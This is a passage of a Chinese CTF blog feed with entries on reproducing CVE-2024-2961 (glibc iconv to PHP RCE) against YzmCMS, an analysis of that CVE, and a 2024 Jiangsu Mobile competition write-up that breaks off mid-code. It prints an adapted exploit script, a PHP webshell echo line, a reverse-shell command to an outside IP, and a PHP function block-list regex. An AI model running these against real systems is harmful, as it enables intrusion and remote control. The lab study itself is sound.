class="hljs-string">&quot;/openlog|syslog|readlink|symlink|passthru|stream_socket_server|scandir|assert|pcntl_exec|fwrite|system|eval|assert|passthru|exec|chroot|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore|get_defined_vars|getallheaders|next|prev|end|array_reverse|glob|file_put_contents/is&quot;</span>,<span class="hljs-variable">$fun</span>))&#123;<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;hacker！！！&quot;</span>);&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/proc|environ/is&quot;</span>,<span class="hljs-variable">$rule</span>))&#123;<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;hacker！！！也许你应该看看源码，救赎之道就在其中&quot;</span>);&#125;<br></code></pre></td></tr></table></figure><p>如何绕过呢，定位下方的代码</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-11-18172538.png" alt="2024-11-18172538"></p><p>array_map有着回调函数的功能，可以让rule为一个数组，这样就可以利用数组绕过正则匹配，并且实现回调函数</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-11-18172817.png" alt="2024-11-18172817"></p><h2 id="复现"><a class="markdownIt-Anchor" href="#复现"></a> 复现</h2><p>改一下cve的脚本，剩余的都是一样的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># CNEXT: PHP file-read to RCE</span><br><span class="hljs-comment"># Date: 2024-05-27</span><br><span class="hljs-comment"># Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># TODO Parse LIBC to know if patched</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># INFORMATIONS</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># To use, implement the Remote class, which tells the exploit how to send the payload.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># REQUIREMENTS</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Requires ten: https://github.com/cfreal/ten</span><br><span class="hljs-comment">#</span><br><br><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> annotations<br><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">from</span> dataclasses <span class="hljs-keyword">import</span> dataclass<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> requests.exceptions <span class="hljs-keyword">import</span> ChunkedEncodingError, ConnectionError<br><span class="hljs-keyword">from</span> ten <span class="hljs-keyword">import</span> *<br><br>HEAP_SIZE = <span class="hljs-number">2</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span><br>BUG = <span class="hljs-string">&quot;劄&quot;</span>.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Remote</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;A helper class to send the payload and download files.</span><br><span class="hljs-string"></span><br><span class="hljs-string">    The logic of the exploit is always the same, but the exploit needs to know how to</span><br><span class="hljs-string">    download files (/proc/self/maps and libc) and how to send the payload.</span><br><span class="hljs-string"></span><br><span class="hljs-string">    The code here serves as an example that attacks a page that looks like:</span><br><span class="hljs-string"></span><br><span class="hljs-string">    ```php</span><br><span class="hljs-string">    &lt;?php</span><br><span class="hljs-string"></span><br><span class="hljs-string">    $data = file_get_contents($_POST[&#x27;file&#x27;]);</span><br><span class="hljs-string">    echo &quot;File contents: $data&quot;;</span><br><span class="hljs-string">    ```</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Tweak it to fit your target, and start the exploit.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, url: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-variable language_">self</span>.url = url<br>        <span class="hljs-variable language_">self</span>.session = Session()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; Response:<br>        <span class="hljs-string">&quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        random_string = <span class="hljs-string">&#x27;&#x27;</span>.join(random.sample(string.ascii_letters + string.digits, <span class="hljs-number">6</span>))<br>        data1 = &#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;yzmcms&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;yzmcms&quot;</span>, <span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-string">&quot;gxngxngxn&quot;</span>&#125;<span class="hljs-comment">#登录后台</span><br>        <span class="hljs-variable language_">self</span>.session.get(<span class="hljs-variable language_">self</span>.url + <span class="hljs-string">&quot;/admin/index/login.html&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.session.post(url=<span class="hljs-variable language_">self</span>.url + <span class="hljs-string">&quot;/admin/index/login.html&quot;</span>, data=data1)<br>        yzm_csrf_token = re.search(<span class="hljs-string">r&quot;var yzm_csrf_token = &#x27;([^&#x27;]+)&#x27;;&quot;</span>,<span class="hljs-variable language_">self</span>.session.get(<span class="hljs-variable language_">self</span>.url + <span class="hljs-string">&quot;/admin/admin_manage/init.html&quot;</span>).text).group(<span class="hljs-number">1</span>)<span class="hljs-comment">#提取的 CSRF 令牌会存储在变量 yzm_csrf_token</span><br>        <span class="hljs-comment">#print(path)</span><br>        payload = &#123;<span class="hljs-string">&quot;adminname&quot;</span>: random_string, <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;123456&quot;</span>, <span class="hljs-string">&quot;password2&quot;</span>: <span class="hljs-string">&quot;123456&quot;</span>, <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;realname&quot;</span>: <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;nickname&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;roleid[0]&quot;</span>: [<span class="hljs-string">&quot;eq&quot;</span>],<span class="hljs-string">&quot;roleid[1][]&quot;</span>: [path],<span class="hljs-string">&quot;roleid[2]&quot;</span>: [<span class="hljs-string">&quot;readfile&quot;</span>],<span class="hljs-string">&quot;dosubmit&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;yzm_csrf_token&quot;</span>: yzm_csrf_token&#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.session.post(url=<span class="hljs-variable language_">self</span>.url + <span class="hljs-string">&quot;/admin/admin_manage/add.html&quot;</span>, data=payload)<span class="hljs-comment">#构造shell</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;Returns the contents of a remote file.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        path = <span class="hljs-string">f&quot;php://filter/convert.base64-encode/resource=<span class="hljs-subst">&#123;path&#125;</span>&quot;</span><br>        response = <span class="hljs-variable language_">self</span>.send(path)<br>        data = response.re.search(<span class="hljs-string">r&#x27;([A-Za-z0-9+/=]+)(?=&#123;&quot;status)&#x27;</span>, flags=re.S).group(<span class="hljs-number">1</span>)<span class="hljs-comment">#匹配内容</span><br>        <span class="hljs-keyword">return</span> base64.decode(data)<br></code></pre></td></tr></table></figure><p>主要修改的是<code>send</code>这里的，以及<code>download</code>里的正则匹配。脚本需要多跑几次，会有失败的概率。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&quot;echo &#x27;&lt;?php @eval(<span class="hljs-variable">$_POST</span>[&#x27;cmd&#x27;]); ?&gt;&#x27; &gt;orange.php&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-11-18174814.png" alt="2024-11-18174814"></p><p>尝试写马进去没用,前端命令执行没回显(没有尝试yijian)</p><p>写个shell看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/27.25.151.99/5566 0&gt;&amp;1&#x27;&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-11-18181140.png" alt="2024-11-18181140"></p><p>看一下vps</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-11-18180121.png" alt="2024-11-18180121"></p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-11-18180353.png" alt="2024-11-18180353"></p><p>(前前后后开了三次靶机所以端口会进行变化)</p><hr><p>利用该cve也就是改改这部分对应的内容，主要熟能生巧，前前后后学习两天，也抽空分析了鹏程杯该cve相关题目，大抵应该会了吧。</p>]]></content>
    
    
    <categories>
      
      <category>每日一题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>cms</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2024-2961</title>
    <link href="/2024/11/17/cve%E5%A4%8D%E7%8E%B0/CVE-2024-2961/"/>
    <url>/2024/11/17/cve%E5%A4%8D%E7%8E%B0/CVE-2024-2961/</url>
    
    <content type="html"><![CDATA[<p>参考链接：</p><p><a href="https://xz.aliyun.com/t/14690?time__1311=GqAhYKBK0K7Ie05DKAf1K%3D4iKi%3DGCYS9feD">【翻译】从设置字符集到RCE：利用 GLIBC 攻击 PHP 引擎（篇一） - 先知社区</a></p><p><a href="https://www.bilibili.com/video/BV1kY8zeUEPr/">Nepnep Web 组第一周队内分享哔哩哔哩_bilibili</a></p><p>该漏洞已在国内大型的ctf赛事活跃，博主本人却是一直不会，在此好好学习一番内容。</p><p>复现环境：</p><p><a href="https://github.com/vulhub/vulhub/tree/master/php/CVE-2024-2961">vulhub/php/CVE-2024-2961 at master · vulhub/vulhub</a></p><h2 id="环境搭建"><a class="markdownIt-Anchor" href="#环境搭建"></a> 环境搭建</h2><p>直接环境git下来然后docker起一下就行了，我使用的默认源码(用的小水滴起的内容)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    <br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File contents: <span class="hljs-subst">$data</span>&quot;</span>;<br></code></pre></td></tr></table></figure><p>访问<code>index.php</code>传入file参数就能读取文件</p><p><img src="/../../images/cve%E5%A4%8D%E7%8E%B0/2024-11-17172325.png" alt="2024-11-17172325"></p><h2 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h2><h3 id="闲言碎语"><a class="markdownIt-Anchor" href="#闲言碎语"></a> 闲言碎语</h3><p>如上文的<code>file_get_contents($_POST['file']);</code>我们可以利用<code>file</code>传值进行读取，比如就像上方的读取<code>/etc/passwd</code>，但是php还支持其他协议比如<code>http://google.com</code>，这样就可以获取<code>google</code>的首页了，也可以使用ftp来获取内容，当然最主要的内容是php协议还自定义了<code>phar://</code>协议。</p><p><code>phar://</code>可以读取PHAR存档的全部内容,PHAR 代表 PHP 存档，是一组文件，比如：</p><ul><li>源代码</li><li>资源</li><li>序列化的元数据</li></ul><p>该协议是常见php泄漏点，当使用它访问一个PHAR文件时，其元数据会被反序列化。</p><p>随着版本的推移，利用点变少，但是<code>phar://</code>并非攻击者唯一有用的协议；另一个名为<code>php://filter</code>的协议同样取得了显著成效。那么就先把视角专业到php过滤器上面。</p><p><code>php://filter</code>这一PHP特有的协议，它提供了一种在返回流之前对其应用转换的方法。其语法如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php://filter/[filters...]/resource=[resource]<br></code></pre></td></tr></table></figure><p>比如我们可以通过<code>convert.base64-encode</code>这个很常见的过滤器来读取<code>/etc/passwd</code>来进行</p><p><img src="/../../images/cve%E5%A4%8D%E7%8E%B0/2024-11-17221641.png" alt="2024-11-17221641"></p><p>理所当然也可以进行两次<code>convert.base64-encode</code></p><p>除此之外还有很多过滤器，比如：</p><ul><li>string.upper ，将字符串转换为大写</li><li>string.lower ，将字符串转换为小写</li><li>string.rot13 ，执行一些 BC 加密</li><li>convert.iconv.X.Y ，将字符集从 X 转换为</li></ul><p>最后一个过滤器： convert.iconv.X.Y 。假设需要将文件从 UTF8 转换为 UTF16，可以用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php://filter/convert.iconv.UTF-8.UTF-16/resource=/etc/passwd<br></code></pre></td></tr></table></figure><p>当然过滤器也出现了filterchain的考察点，这里不多述了。</p><h3 id="cve知识点"><a class="markdownIt-Anchor" href="#cve知识点"></a> cve知识点</h3><p>这边不多叙述，pwn知识我了解较少，原文博主的pwn水平非常之高。主要的内容是</p><p>glibc中<code>iconv()</code>函数将一些数据转换成<code>ISO-2022-CN-EXT</code>格式时，会有1-3字节的溢出。</p><h4 id="iconv-api"><a class="markdownIt-Anchor" href="#iconv-api"></a> iconv() API</h4><p>一般情况下，每个 char 类型的字符占一个字节，但在<code>iconv</code>编码转义的时候则可能转义为多个字节，不过这依旧是在缓冲区预期之内的</p><p>当PHP从一个字符集转换到另一个字符集时，它使用 <code>iconv</code>，这是一个用于“<strong>使用转换描述符将输入缓冲区中的字符转换为输出缓冲区</strong>”的API。在Linux系统上，这个API由 <code>glibc</code>实现API非常简单。首先，打开一个转换描述符，该描述符指定了输入和输出字符集.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">iconv_t</span> <span class="hljs-title function_">iconv_open</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *tocode, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *fromcode)</span>;<br></code></pre></td></tr></table></figure><p>然后，使用<code>iconv()</code>将输入缓冲区<code>inbuf</code>转换为输出缓冲区<code>outbuf</code>中的新字符集</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> <span class="hljs-title function_">iconv</span><span class="hljs-params">(<span class="hljs-type">iconv_t</span> cd,</span><br><span class="hljs-params">            <span class="hljs-type">char</span> **<span class="hljs-keyword">restrict</span> inbuf, <span class="hljs-type">size_t</span> *<span class="hljs-keyword">restrict</span> inbytesleft,</span><br><span class="hljs-params">            <span class="hljs-type">char</span> **<span class="hljs-keyword">restrict</span> outbuf, <span class="hljs-type">size_t</span> *<span class="hljs-keyword">restrict</span> outbytesleft)</span>;<br></code></pre></td></tr></table></figure><p>如果输出缓冲区不够大，<code>iconv()</code> 将返回一个错误指示此情况，可以通过重新分配 <code>outbuf</code> 并再次调用 <code>iconv()</code> 来继续转换。</p><h4 id="iso-2022-cn-ext"><a class="markdownIt-Anchor" href="#iso-2022-cn-ext"></a> ISO-2022-CN-EXT</h4><p>在将数据转换为 ISO-2022-CN-EXT 字符集时，<code>iconv</code>可能在写入输出缓冲区之前未能检查是否有足够的空间剩余</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// iconvdata/iso-2022-cn-ext.c</span><br><br><span class="hljs-comment">/* See whether we have to emit an escape sequence.  */</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">set</span> != used)<br>&#123;<br>    <span class="hljs-comment">/* First see whether we announced that we use this</span><br><span class="hljs-comment">        character set.  */</span><br>    <span class="hljs-keyword">if</span> ((used &amp; SO_mask) != <span class="hljs-number">0</span> &amp;&amp; (ann &amp; SO_ann) != (used &lt;&lt; <span class="hljs-number">8</span>)) <span class="hljs-comment">// [1]</span><br>    &#123;<br>        <span class="hljs-type">const</span> <span class="hljs-type">char</span> *escseq;<br><br>        <span class="hljs-keyword">if</span> (outptr + <span class="hljs-number">4</span> &gt; outend) <span class="hljs-comment">// &lt;-------------------- 检查点</span><br>        &#123;<br>            result = __GCONV_FULL_OUTPUT;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        assert(used &gt;= <span class="hljs-number">1</span> &amp;&amp; used &lt;= <span class="hljs-number">4</span>);<br>        escseq = <span class="hljs-string">&quot;)A\0\0)G)E&quot;</span> + (used - <span class="hljs-number">1</span>) * <span class="hljs-number">2</span>;<br>        *outptr++ = ESC;<br>        *outptr++ = <span class="hljs-string">&#x27;$&#x27;</span>;<br>        *outptr++ = *escseq++;<br>        *outptr++ = *escseq++;<br><br>        ann = (ann &amp; ~SO_ann) | (used &lt;&lt; <span class="hljs-number">8</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((used &amp; SS2_mask) != <span class="hljs-number">0</span> &amp;&amp; (ann &amp; SS2_ann) != (used &lt;&lt; <span class="hljs-number">8</span>)) <span class="hljs-comment">// [2]</span><br>    &#123;<br>        <span class="hljs-type">const</span> <span class="hljs-type">char</span> *escseq;<br><br>        <span class="hljs-comment">// &lt;-------------------- 无检查点</span><br><br>        assert(used == CNS11643_2_set); <span class="hljs-comment">/* XXX */</span><br>        escseq = <span class="hljs-string">&quot;*H&quot;</span>;<br>        *outptr++ = ESC;<br>        *outptr++ = <span class="hljs-string">&#x27;$&#x27;</span>;<br>        *outptr++ = *escseq++;<br>        *outptr++ = *escseq++;<br><br>        ann = (ann &amp; ~SS2_ann) | (used &lt;&lt; <span class="hljs-number">8</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((used &amp; SS3_mask) != <span class="hljs-number">0</span> &amp;&amp; (ann &amp; SS3_ann) != (used &lt;&lt; <span class="hljs-number">8</span>)) <span class="hljs-comment">// [3]</span><br>    &#123;<br>        <span class="hljs-type">const</span> <span class="hljs-type">char</span> *escseq;<br><br>        <span class="hljs-comment">// &lt;-------------------- 无检查点</span><br><br>        assert((used &gt;&gt; <span class="hljs-number">5</span>) &gt;= <span class="hljs-number">3</span> &amp;&amp; (used &gt;&gt; <span class="hljs-number">5</span>) &lt;= <span class="hljs-number">7</span>);<br>        escseq = <span class="hljs-string">&quot;+I+J+K+L+M&quot;</span> + ((used &gt;&gt; <span class="hljs-number">5</span>) - <span class="hljs-number">3</span>) * <span class="hljs-number">2</span>;<br>        *outptr++ = ESC;<br>        *outptr++ = <span class="hljs-string">&#x27;$&#x27;</span>;<br>        *outptr++ = *escseq++;<br>        *outptr++ = *escseq++;<br><br>        ann = (ann &amp; ~SS3_ann) | (used &lt;&lt; <span class="hljs-number">8</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>每个块向<code>outbuf</code>（由<code>outptr</code>指向）写入不同的转义序列。</p><p>在第一个if<code>[1]</code>里，前面有一个额外的<code>if()</code>块来检查输出缓冲区是否足够大以容纳四个字符。</p><p>而其他两个if<code>[2][3]</code>则没有对 outptr 进行检查。因此，转义序列可能会越界写入。,一般的常规汉字没有溢出的效果，但是利用如： <code>劄</code> 、 <code>䂚</code> 或 <code>峛</code>、<code>湿</code>这种字符，在<code>iconv()</code>转义时会导致1到3字节的溢出。具体不演示</p><p>既然能实现缓冲区溢出，那就能实现rce</p><h2 id="poc分析"><a class="markdownIt-Anchor" href="#poc分析"></a> Poc分析</h2><p>核心代码在</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">def <span class="hljs-title function_ invoke__">run</span>(<span class="hljs-built_in">self</span>) -&gt; None:<br>    <span class="hljs-built_in">self</span>.<span class="hljs-title function_ invoke__">check_vulnerable</span>()<br>    <span class="hljs-built_in">self</span>.<span class="hljs-title function_ invoke__">get_symbols_and_addresses</span>()<br>    <span class="hljs-built_in">self</span>.<span class="hljs-title function_ invoke__">exploit</span>()<br></code></pre></td></tr></table></figure><p><code>check_vulnerable</code>方法仅用于检测相关的 wrapper 是否可用，需要获取完整的回显，如果回显经过了 aes 或者 md5 之类的加密则这个检测方法不可用</p><p><code>get_symbols_and_addresses</code>是用来获取 <code>/proc/self/maps</code> 和<code>libc.so.6</code> 的</p><p><code>exploit</code>方法就是pwn。</p><h2 id="复现"><a class="markdownIt-Anchor" href="#复现"></a> 复现</h2><p>需要python310环境和linux环境</p><p><img src="/../../images/cve%E5%A4%8D%E7%8E%B0/2024-11-17215020.png" alt="2024-11-17215020"></p><p>访问<code>shell.php即可</code></p><hr><p>这类题最关键的还是如何修改脚本，需要好好学习学习。</p><p>相关例题可以参考2024年羊城杯，2024年鹏程杯等等。稍微学习一下怎么修改，这个知识点大概就没什么问题了。</p>]]></content>
    
    
    <categories>
      
      <category>cve复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rce</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>江苏移动网络安全竞赛2024(初赛)</title>
    <link href="/2024/11/16/%E6%B1%9F%E8%8B%8F%E7%A7%BB%E5%8A%A8/wp/"/>
    <url>/2024/11/16/%E6%B1%9F%E8%8B%8F%E7%A7%BB%E5%8A%A8/wp/</url>
    
    <content type="html"><![CDATA[<p>前言：摸摸鱼啦，ai小子的wp</p><h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h2><h3 id="easy-sm"><a class="markdownIt-Anchor" href="#easy-sm"></a> easy-sm</h3><p>爆破后六位密码即可，用ai写一下，跑大约一分钟多一些，可以尝试多线程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmssl <span class="hljs-keyword">import</span> sm3, func<br><br><span class="hljs-comment"># 给定的哈希值</span><br>target_hash = <span class="hljs-string">&quot;f1127f0189ad9e1bde949fb14991db82c9c9b41e90edcf014898595e8ab908c0&quot;</span><br><br><span class="hljs-comment"># 生成可能的密码并比较</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">crack_password</span>():<br>    prefix = <span class="hljs-string">&quot;admin&quot;</span><br>    <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000000</span>):  <span class="hljs-comment"># 6 位数字范围</span><br>        suffix = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;num:06&#125;</span>&quot;</span>  <span class="hljs-comment"># 补全为 6 位</span><br>        password = prefix + suffix<br>        <span class="hljs-comment"># 计算密码的哈希值</span><br>        hash_value = sm3.sm3_hash(func.bytes_to_list(password.encode()))<br>        <span class="hljs-keyword">if</span> hash_value == target_hash:<br>            <span class="hljs-keyword">return</span> password<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-comment"># 执行破解</span><br>password = crack_password()<br><span class="hljs-keyword">if</span> password:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;找到密码：flag&#123;&#123;<span class="hljs-subst">&#123;password&#125;</span>&#125;&#125;&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;未找到匹配的密码&quot;</span>)<br><br></code></pre></td></tr></table></figure><h3 id="easy-train"><a class="markdownIt-Anchor" href="#easy-train"></a> easy-train</h3><p>先进行base62,再进行atbash,根据uuid的特性rot13调整字母的合理范围</p><p><img src="/../../images/%E6%B1%9F%E8%8B%8F%E7%A7%BB%E5%8A%A8/2024-11-16115824.png" alt="2024-11-16115824"></p><p>然后随波逐流爆破看看得到flag</p><p><img src="/../../images/%E6%B1%9F%E8%8B%8F%E7%A7%BB%E5%8A%A8/2024-11-16115819.png" alt="2024-11-16115024"></p><h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> web</h2><h3 id="web签到"><a class="markdownIt-Anchor" href="#web签到"></a> web签到</h3><p>shrio框架，用onefox里的框架工具进行</p><p>先爆破密钥</p><p>然后直接命令执行就行</p><p><img src="/../../images/%E6%B1%9F%E8%8B%8F%E7%A7%BB%E5%8A%A8/2024-11-16115024.png" alt="2024-11-16115024"></p><h3 id="web2"><a class="markdownIt-Anchor" href="#web2"></a> web2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Who</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span 